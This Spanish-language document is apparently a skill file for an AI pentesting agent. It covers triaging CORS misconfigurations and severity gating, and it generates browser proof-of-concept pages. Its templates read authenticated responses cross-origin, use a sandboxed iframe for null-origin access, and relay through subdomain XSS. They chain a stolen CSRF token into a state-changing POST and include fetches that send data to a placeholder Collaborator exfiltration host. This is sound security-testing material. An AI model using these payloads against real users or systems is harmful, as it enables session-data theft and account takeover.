---
name: cors
description: Detecta y explota CORS misconfigurations — origin reflection sin validación,
  null origin aceptado, subdominio confiado con XSS/takeover posible, wildcard con
  credentials. Skill standalone con su propio evidence gate. El impacto real requiere
  que el operador ejecute el PoC desde un browser autenticado.
sources: internal (built from scratch, evidence-gate-first)
---

## Qué es esto y qué NO es

CORS (Cross-Origin Resource Sharing) es el mecanismo por el que un servidor declara
qué orígenes pueden leer sus responses HTTP desde código JS cross-origin. El problema
es cuando esa declaración es demasiado permisiva: permite que un origen controlado
por el atacante haga un `fetch` con credenciales de la víctima y lea la respuesta.

**Lo que CORS no protege:** requests que el browser hace sin JS (form submit, imagen,
navegación directa). Para eso hay CSRF. La distinción importa: CORS mal configurado
habilita lectura cross-origin; CSRF habilita acciones cross-origin. Son vectores
distintos aunque a veces coexisten.

**Lo que este skill NO cubre:**
- **CSRF** — si el endpoint es state-changing y no usa tokens, cargar `hunt-csrf`.
- **postMessage** — CORS no aplica a mensajería entre frames, cargar `postMessage`.
- **CORS como defensa de CSRF** — `SameSite` y tokens CSRF son la defensa; una
  política CORS permisiva no introduce CSRF por sí sola (pero sí habilita que un
  atacante lea el token CSRF del siguiente request si no hay otras protecciones).

## Señales de activación

Cargar este skill cuando en la sección `## CORS` de `recon.md` aparezca cualquiera:

- `Access-Control-Allow-Origin` presente en cualquier response de endpoint con datos
- `Access-Control-Allow-Credentials: true` junto a un ACAO no-wildcard
- ACAO que refleja el valor del header `Origin` de la request
- ACAO con valor `null`
- ACAO con un subdominio del target (potencial relay si ese subdominio es vulnerable)

Input base: sección `## CORS` de `recon.md` (endpoints, headers observados, si refleja
origin) y sección `## Cookies y tokens` (flags de cookies, si las cookies de sesión
viajan en requests cross-origin, si hay JWTs en headers).

---

## Conocimiento previo

Use the `hexbrain` skill for relevant public prior art when it can change the test plan; verify any lead against primary sources and target evidence.

## Fase 1 — Análisis de configuración

Por cada endpoint con headers CORS en `recon.md`, responder estas preguntas en orden.
No pasar a Fase 2 sin clasificar todos los endpoints.

### 1.1 — Patrón de ACAO detectado

| Patrón de ACAO | ACAC | Evaluación |
|---|---|---|
| Refleja `Origin` de la request literal | `true` | **Crítico** — cualquier origen puede leer la response con credenciales |
| Refleja `Origin` de la request literal | ausente / `false` | **Limitado** — puede leer la response pero sin cookies; útil si hay Bearer en header |
| `*` (wildcard) | `true` | **Imposible por spec** — los browsers rechazan esta combinación; documentar como misconfiguration de config pero no explotable en browsers modernos |
| `*` (wildcard) | ausente / `false` | Sin impacto directo — no se pueden adjuntar credenciales; seguir si el endpoint devuelve datos sensibles sin auth |
| `null` | `true` | **Explotable** — un iframe sandboxed manda `Origin: null`; explotar vía Cadena B |
| `null` | ausente / `false` | Menor — sin credenciales el impacto depende de qué datos devuelve el endpoint sin auth |
| Subdominio del target (`sub.target.com`) | `true` | **Dependiente** — explotable si ese subdominio tiene XSS o takeover; cruzar con `hunt-external-takeover` y resultados de `domain-recon` |
| Lista explícita de orígenes confiables sin reflection | cualquiera | Analizar si algún origen de la lista es controlable por el atacante (subdominio takeover, OAuth redirect) |

**Regla adicional para reflection:** verificar si la reflection es total (cualquier
`Origin` se refleja) o parcial (solo refleja orígenes que matchean un sufijo/prefijo).
Verificar en los datos de `recon.md` — si no está claro, documentar como pendiente
de confirmación con una request manual.

### 1.2 — ¿Qué datos expone el endpoint?

El impacto de la misconfiguration depende de qué hay en la response. Clasificar:

| Contenido de la response | Impacto potencial |
|---|---|
| Token de sesión / API key / Bearer token | ATO directo — P1/P2 |
| Datos de la cuenta del usuario autenticado (email, PII, payment info) | P2 según sensibilidad |
| CSRF token para requests subsiguientes | Neutraliza protección CSRF de otros endpoints |
| Datos de otros usuarios (BOLA subyacente) | P1/P2 — cruzar con `idor-bola` |
| Datos propios de bajo valor / preferencias | P3/P4 — information disclosure |
| Response pública, sin datos sensibles | Sin impacto directo — cerrar con killer |

**Si el endpoint devuelve un CSRF token:** la explotación es en dos pasos — leer el
token con el fetch CORS, luego usarlo para un request CSRF. Documentar como cadena
con `hunt-csrf` y escalar severidad.

### 1.3 — Cookies y tokens (de sección `## Cookies y tokens` de recon.md)

Para que `ACAC: true` sea explotable, las cookies de sesión deben adjuntarse:

- **Cookie sin `SameSite`** o con `SameSite=None; Secure` → se adjunta en requests
  cross-site → explotable con `credentials: 'include'` en el PoC.
- **Cookie con `SameSite=Strict` o `SameSite=Lax`** → no se adjunta en requests
  cross-site iniciados desde JS → la explotación con `credentials: 'include'` falla.
  Documentar como bloqueado por SameSite, no matar el lead todavía: verificar si
  hay endpoints que acepten Bearer token en `Authorization` header (esos sí viajan
  aunque SameSite bloquee las cookies).
- **Auth vía Bearer token en `Authorization` header** → el fetch del atacante no
  puede inyectar ese header con el token de la víctima. CORS misconfiguration sola
  no alcanza — requiere que el atacante ya tenga el token. Cerrar como no explotable
  standalone; documentar si encadena con XSS.

### 1.4 — Clasificación del endpoint

Con el resultado de 1.1, 1.2 y 1.3, clasificar:

- **Sin riesgo** — ACAO estricto (lista explícita sin origins controlables) o
  wildcard sin credenciales con response pública. Killer específico.
- **Candidato activo** — reflection o `null` aceptado + ACAC: true + cookies sin
  SameSite + response con datos sensibles. Pasar a Fase 2.
- **Candidato dependiente** — explotable solo si un subdominio confiado tiene XSS
  o takeover. Documentar condición en `leads.md` como BLOQUEADO con killer.
- **Candidato limitado** — reflection pero sin ACAC o con SameSite bloqueando;
  response con datos de bajo valor. Documentar como P4 con gate pendiente de
  confirmación del operador sobre el contenido real de la response.

---

## Fase 2 — Generación de PoC

**El agente NO ejecuta nada en esta fase.** Genera el HTML y lo documenta en
`leads.md` para que el operador lo abra en su browser con sesión activa.

El PoC se guarda como `targets/<target>/poc_cors_<endpoint_id>.html`.

### 2.1 — Estructura base del PoC (Cadena A — origin reflection)

```html
<!DOCTYPE html>
<html>
<head><title>CORS PoC — [TARGET] — [ENDPOINT_ID]</title></head>
<body>
<pre id="output">Ejecutando...</pre>
<script>
  fetch('https://[TARGET]/[ENDPOINT]', {
    method: 'GET',              // cambiar si el endpoint usa POST/PUT
    credentials: 'include',    // adjunta cookies de sesión de la víctima
    headers: {
      // Solo si el endpoint requiere Content-Type específico:
      // 'Content-Type': 'application/json'
    }
  })
  .then(r => r.text())
  .then(data => {
    document.getElementById('output').textContent = data;
    // Exfiltración opcional — reemplazar con URL de Collaborator/webhook propio:
    // fetch('https://COLLABORATOR.burpcollaborator.net/exfil', { method: 'POST', body: data });
  })
  .catch(e => document.getElementById('output').textContent = 'Error: ' + e);
</script>
</body>
</html>
```

**Instrucciones para el operador:**
1. Abrir el browser con sesión activa en el target.
2. Abrir una pestaña nueva y navegar a este HTML (servido desde `localhost` o
   cualquier origen distinto al target — no abrirlo con `file://`, algunos browsers
   tratan `file://` como `null` origin).
3. Verificar que la response visible en pantalla contiene datos de la cuenta autenticada.
4. Si se necesita exfiltración: descomentar la línea de fetch a Collaborator y
   verificar el callback.

### 2.2 — Variantes por cadena de explotación

#### Cadena A — Origin reflection con credentials

El PoC base de 2.1 cubre este caso. El browser enviará automáticamente el header
`Origin: https://[ORIGEN_DEL_POC]` y si el server lo refleja en `ACAO` + devuelve
`ACAC: true`, el browser permitirá leer la response.

Confirmación: la response visible en el PoC contiene datos del usuario autenticado
(no un error CORS, no una response vacía).

#### Cadena B — Null origin

```html
<!DOCTYPE html>
<html>
<head><title>CORS null origin PoC — [TARGET] — [ENDPOINT_ID]</title></head>
<body>
<pre id="output">Ejecutando...</pre>
<!-- El iframe sandboxed envía Origin: null -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('https://[TARGET]/[ENDPOINT]', {
      credentials: 'include'
    })
    .then(r => r.text())
    .then(data => parent.postMessage(data, '*'))
    .catch(e => parent.postMessage('Error: ' + e, '*'));
  <\/script>
"></iframe>
<script>
  window.addEventListener('message', function(e) {
    document.getElementById('output').textContent = e.data;
  });
</script>
</body>
</html>
```

Nota: el `srcdoc` del iframe envía `Origin: null`. Si el server acepta `null` en
ACAO y devuelve ACAC: true, el fetch dentro del iframe puede leer la response.

#### Cadena C — Subdominio confiado como relay

Solo aplica cuando el ACAO acepta un subdominio del target y ese subdominio tiene
XSS confirmado (o takeover confirmado). El PoC se construye como XSS en el subdominio
que ejecuta el fetch al endpoint principal.

```javascript
// Payload de XSS inyectado en sub.target.com que lee el endpoint cors-vulnerable:
fetch('https://target.com/[ENDPOINT]', { credentials: 'include' })
  .then(r => r.text())
  .then(data => fetch('https://COLLABORATOR.burpcollaborator.net/exfil', {
    method: 'POST', body: data
  }));
```

Documentar como BLOQUEADO si el XSS o takeover del subdominio no está confirmado.
Killer: `"relay vía sub.target.com — pendiente de [XSS/takeover confirmado en ese subdominio]"`.

#### Cadena D — CORS + CSRF token exfil (cadena de dos pasos, secuencial)

Aplica cuando el endpoint cors-vulnerable devuelve un CSRF token en su response.
**Los dos pasos son estrictamente secuenciales — el Paso 2 no existe sin el token
del Paso 1.** El PoC los ejecuta en cadena dentro de un mismo bloque; no son
requests independientes.

**Paso 1 — GET con credentials al endpoint que devuelve el token:**
leer la response cross-origin aprovechando la misconfiguration CORS, extraer el
CSRF token del HTML o JSON devuelto.

**Paso 2 — POST state-changing con el token robado:**
usar el token extraído en el Paso 1 para enviar el request que la defensa CSRF
supuestamente protegía. Sin el token del Paso 1, este request sería rechazado
por el server exactamente igual que cualquier CSRF clásico.

```javascript
// Los dos pasos van juntos — no separar en requests distintos.
// Si el Paso 1 falla (CORS bloqueado, token no encontrado), detener y documentar.

// PASO 1: leer el CSRF token via CORS misconfiguration
fetch('https://[TARGET]/[ENDPOINT_QUE_DEVUELVE_CSRF_TOKEN]', {
  method: 'GET',
  credentials: 'include'   // adjunta cookies de sesión de la víctima
})
  .then(r => {
    if (!r.ok) throw new Error('Paso 1 falló: ' + r.status + ' — CORS bloqueado o sesión inválida');
    return r.text();
  })
  .then(html => {
    // Extraer el token del HTML o JSON según la estructura real del target.
    // Ajustar el regex al nombre y formato exacto del token observado en recon.md:
    var token = html.match(/csrf[_-]token['":\s]+([a-zA-Z0-9_\-]+)/i)?.[1];
    if (!token) throw new Error('Paso 1 falló: token no encontrado en la response — revisar el regex');

    document.getElementById('output').textContent = 'Paso 1 OK — token: ' + token + '\nEjecutando Paso 2...';

    // PASO 2: usar el token robado en el request state-changing
    // Solo se ejecuta si el Paso 1 entregó un token válido.
    return fetch('https://[TARGET]/[ENDPOINT_STATE_CHANGING]', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ csrf_token: token, [PARAM]: [VALOR] })
    });
  })
  .then(r => r.text())
  .then(data => document.getElementById('output').textContent += '\nPaso 2 response: ' + data)
  .catch(e => document.getElementById('output').textContent = 'Error: ' + e.message);
```

Confirmación del Paso 1: el operador debe verificar que el token visible en pantalla
no es `undefined` ni vacío antes de considerar que el Paso 2 tiene sentido. Si el
Paso 1 falla con error CORS, la misconfiguration no es explotable desde ese origen
— revisar si aplica Cadena B o C.

Confirmación del Paso 2: verificar el estado desde la cuenta víctima después de
ejecutar el PoC (baseline → ejecución → verificación → cleanup), mismo protocolo
que `hunt-csrf`. El 200 en la response del Paso 2 no confirma impacto real sobre
la víctima.

Esta cadena convierte un information disclosure (P3/P4) en account takeover o acción
privilegiada (P2/P1). Documentar en `leads.md` como cadena con `hunt-csrf`.

### 2.3 — Checklist antes de entregar el PoC al operador

- [ ] El endpoint del fetch apunta a la URL exacta observada en `recon.md` (con path
  completo, no solo el dominio)
- [ ] El método HTTP es el correcto para ese endpoint (GET, POST, etc.)
- [ ] Si el endpoint acepta JSON, el `Content-Type` está seteado — pero verificar
  primero si el server acepta la request preflighted (POST con JSON dispara un
  preflight OPTIONS que puede bloquear la cadena)
- [ ] Las instrucciones para el operador especifican desde qué origen servir el PoC
  (no `file://`)
- [ ] La línea de exfiltración tiene la URL del Collaborator/webhook del operador,
  o está comentada con instrucciones claras
- [ ] Si la Cadena D modifica estado, hay instrucciones de cleanup

---

## Gate de evidencia — techo de severidad

| Evidencia | Techo |
|---|---|
| ACAO refleja origin + ACAC: true detectado en headers de `recon.md` | **Informational / P4** — misconfiguration observable, impacto no confirmado |
| PoC armado y documentado, no ejecutado todavía | **Informational / P4** — igual que arriba |
| Operador ejecuta el PoC y la response es legible cross-origin (sin datos sensibles) | **P4 / P3** — mecanismo confirmado, impacto bajo |
| Response contiene datos propios de la cuenta (email, PII, preferencias) | **P3** — information disclosure confirmado |
| Response contiene token de sesión / Bearer / API key exfiltrable | **P2** — escalada a ATO potencial |
| ATO completado o datos de otros usuarios exfiltrados | **P1/P2** según scope e impacto |

**Nunca reportar por encima de P4 sin que el operador haya ejecutado el PoC y
confirmado que la response es legible cross-origin.** "El server refleja el origin"
detectado en headers de recon no es suficiente.

---

## Qué mata el lead

- **SameSite=Strict o SameSite=Lax** en la cookie de sesión Y la auth es solo por
  cookie (sin Bearer) — el browser no adjuntará la cookie en el fetch cross-origin,
  el server verá una request no autenticada. Killer: `"SameSite=[valor] bloquea adjunto
  de cookie; endpoint no acepta Bearer → fetch devuelve response no autenticada"`.
- **`Access-Control-Allow-Origin: *`** (wildcard) — los browsers rechazan `*` +
  `credentials: include` por spec. El fetch con credenciales falla. Sin credenciales
  el impacto depende de si el endpoint devuelve datos sin auth. Killer si la response
  sin auth es pública.
- **Preflight bloqueado** — si el endpoint requiere headers custom (Content-Type:
  application/json, Authorization) el browser manda un OPTIONS preflight. Si el
  server no devuelve los headers CORS en el preflight, la request real nunca se
  manda. Documentar qué headers disparan el preflight y verificar si el endpoint
  acepta `text/plain` o `application/x-www-form-urlencoded` (no disparan preflight).
- **Response no contiene datos sensibles** — confirmar revisando la response real
  con la cuenta del operador. Si solo hay datos estáticos o metadatos irrelevantes,
  cerrar como P4 o Informational.
- **ACAO es lista explícita sin orígenes controlables** — verificar que ninguno de
  los orígenes listados tiene XSS, takeover o redirect abierto que permita usarlo
  como relay.

Documentar el killer con el valor exacto del header y la razón por la que no es
explotable — no "tiene SameSite" genérico.

---

## Encadenamiento

- **XSS en subdominio confiado** → neutraliza cualquier ACAO que confíe en ese
  subdominio. El XSS permite hacer el fetch desde ese origen "legítimo" y exfiltrar
  la response. Cruzar con `xss` y `hunt-external-takeover`.
- **CORS + CSRF token exfil** → leer el token CSRF del endpoint vulnerable permite
  ejecutar acciones state-changing sin que la defensa CSRF proteja. Cruzar con
  `hunt-csrf` — Cadena D de este skill.
- **CORS + IDOR/BOLA** → si el endpoint cors-vulnerable acepta un ID de recurso y
  devuelve datos de otro usuario, la misconfiguration de CORS amplifica el BOLA.
  Cruzar con `idor-bola`.
- **Null origin + sandbox bypass** → si la app embebe contenido third-party en un
  iframe sandboxed y ese iframe tiene origen `null`, puede leer endpoints que acepten
  `null` en ACAO aunque la app principal no tenga XSS.

Al documentar cualquier hallazgo de este skill, correr `chain_analysis.md`
Parte 2 para ese tipo de hallazgo antes de cerrar el lead.

---

## Related Skills & Chains

- **`xss`** — XSS en el mismo origen hace irrelevante cualquier restricción CORS:
  el JS del atacante ya corre desde el origen confiado. Si hay XSS confirmado,
  evaluar si se necesita CORS separado o si XSS ya cubre el impacto.
- **`hunt-csrf`** — CORS y CSRF son vectores distintos pero se encadenan: CORS
  permite leer (incluyendo tokens CSRF), CSRF permite actuar. Ver Cadena D.
- **`hunt-external-takeover`** — un CNAME no reclamado en un subdominio listado
  en ACAO es el bypass más común para políticas que parecen estrictas.
- **`idor-bola`** — si el endpoint CORS-vulnerable opera sobre recursos de otros
  usuarios, el impacto sube a P1/P2 independientemente de la misconfiguration CORS.
- **`postMessage`** — CORS no aplica a postMessage. Si hay ambas señales en
  `recon.md`, analizar cada una con su skill correspondiente.
